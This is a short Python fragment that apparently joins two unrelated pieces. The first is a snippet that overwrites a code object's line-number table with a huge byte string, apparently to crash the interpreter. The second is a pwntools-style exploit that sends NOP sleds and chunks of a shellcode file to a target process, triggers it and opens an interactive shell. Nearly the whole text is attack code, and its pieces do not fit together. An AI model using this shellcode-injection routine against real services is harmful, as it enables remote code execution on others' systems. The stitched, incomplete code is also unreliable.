fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi.gi_frame.f_code
fn.__code__.co_lnotab = b'\x00' * 2147483638
fn()
 
#
# Write to our shellcode
#

p.sendline('\x33\xD2')
p.sendline('\x90' * 50)

shellcode = open("./shellcode", "rb").read()

while (len(shellcode) % 8 != 0):
    shellcode += b'\x90'

for c in chunks(shellcode, 8):
    p.sendline(c)

p.sendline('\x90' * 50)

#
# Trigger the shellcode
#

p.sendline('3')

p.interactive()
